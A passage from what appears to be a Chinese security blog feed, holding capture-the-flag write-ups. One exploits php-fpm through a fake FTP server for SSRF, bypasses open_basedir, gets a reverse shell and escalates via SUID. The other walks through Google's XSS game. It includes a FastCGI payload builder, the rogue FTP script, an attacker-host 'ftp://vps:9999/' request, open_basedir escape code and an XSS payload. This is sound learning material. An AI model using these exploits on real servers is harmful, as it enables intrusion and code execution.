class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'QUERY_STRING'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REQUEST_URI'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'DOCUMENT_URI'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token shell-comment comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token single-quoted-string string">'PHP_VALUE'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_SOFTWARE'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'REMOTE_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">// 找准服务端口</span>    <span class="token single-quoted-string string">'SERVER_ADDR'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PORT'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'80'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_NAME'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'SERVER_PROTOCOL'</span>   <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token single-quoted-string string">'CONTENT_LENGTH'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问拿到payload</p><img src="/article/bluehat2021/image-20210503143546020.png" class="" title="fastpayload" loading="lazy"><h3 id="利用-ftp-与-php-fpm-对话-RCE"><a href="#利用-ftp-与-php-fpm-对话-RCE" class="headerlink" title="利用 ftp 与 php-fpm 对话 RCE"></a>利用 ftp 与 php-fpm 对话 RCE</h3><p>众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 <code>gopher://</code> 协议结合使用（ssrf），该协议受 curl 支持，<strong>但不受 php 支持</strong>。</p><p> <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">php支持的协议和封装协议</a> 可代替发二进制包的协议只有<code>ftp://</code> ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。</p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 / 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p><img src="/article/bluehat2021/t012739ba782705dcdd.jpg" class="" title="ftp" loading="lazy"><p>如图，对于我们这题，显然只能用 pasv 模式，服务器监听的“随机端口”对应 php-fpm 监听的 9000 端口，详细过程我们通过一个实际的 pasv 例子来理解：</p><pre class="language-none"><code class="language-none">testbox1: &#123;&#x2F;home&#x2F;p-t&#x2F;slacker&#x2F;public_html&#125; % ftp -d testbox2Connected to testbox2.slacksite.com.220 testbox2.slacksite.com FTP server ready.Name (testbox2:slacker): slacker---&gt; USER slacker331 Password required for slacker.Password: TmpPass---&gt; PASS XXXX230 User slacker logged in.---&gt; SYST215 UNIX Type: L8Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; passivePassive mode on.ftp&gt; lsftp: setsockopt (ignored): Permission denied---&gt; PASV227 Entering Passive Mode (192,168,150,90,195,149).---&gt; LIST150 Opening ASCII mode data connection for file listdrwx------   3 slacker    users         104 Jul 27 01:45 public_html226 Transfer complete.ftp&gt; quit---&gt; QUIT221 Goodbye.</code></pre><p>以上是客户端 testbox1.slacksite.com (192.168.150.80) 发出 <code>PASV</code> 命令以指示其将等待服务器 testbox2.slacksite.com (192.168.150.90) “被动地”提供 ip 和端口号，然后客户端将创建到服务器的数据连接，其中：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (192,168,150,90,195,149).</code></pre><p>这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 = 50069 端口。</p><p>选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址/端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。</p><p>我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 = 40 ，即可表达为：</p><pre class="language-none"><code class="language-none">227 Entering Passive Mode (127,0,0,1,35,40).</code></pre></blockquote><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务</p><p>在<code>/var/www/html</code>目录写文件<code>file.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token single-quoted-string string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo file_get_contents($file);</span></span></code></pre><p>准备利用前面生成的payload打</p><h3 id="起恶意ftp服务"><a href="#起恶意ftp服务" class="headerlink" title="起恶意ftp服务"></a>起恶意ftp服务</h3><p>用如下脚本，在公网vps起</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2) 注意打到9001端口的服务</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="干"><a href="#干" class="headerlink" title="干"></a>干</h3><p>干就完事了，访问<code>file.php</code>用payload打</p><p><code>./file.php?file=ftp://vps:9999/&amp;data=xxx</code></p><img src="/article/bluehat2021/image-20210503144504813.png" class="" title="gan" loading="lazy"><p>可以看到dump出来<code>int(681)</code>，这里就是打的数据包大小</p><p>这时已经突破open_basedir，可以任意访问目录了，同时也执行了恶意.so文件</p><img src="/article/bluehat2021/image-20210503144951807.png" class="" title="ls&#x2F;" loading="lazy"><p>下面就是suid提权了，那么大一个700 flag就在眼前</p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>既然可以执行恶意.so文件，那么直接弹个shell回来</p><img src="/article/bluehat2021/image-20210503145246770.png" class="" title="shell" loading="lazy"><p>在web shell上传自动化提权探测脚本，这里用的是<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>，执行脚本，这里上传到哪都可以，毕竟已经突破了限制还弹了shell</p><pre class="language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;LinEnum.sh -s -r report -e &#x2F;tmp&#x2F; -t</code></pre><p>查看report</p><img src="/article/bluehat2021/image-20210503145518039.png" class="" title="report" loading="lazy"><p>没想到php就有s权限，直接运行即可</p><p>写文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接运行</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>关于phpfpm与FastCGI模式的研究建议仔细看看部分参考文章，总的来说就是</p><p>FastCGI加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><hr><p>参考文章：</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpm的攻击方式</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi 未授权访问漏洞</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgi绕过姿势</a></p><p><a href="https://www.anquanke.com/post/id/233454">利用ftp 与 php-fpm 对话 RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">复现平台buuoj</a></p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="article/xss/"/>
      <url>article/xss/</url>
      
        <content type="html"><![CDATA[<p>谷歌的小游戏，复习一下xss</p><a id="more"></a><p>项目地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键部分</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GET请求query会直接填入网页html</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>直接打即可，payload:</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token 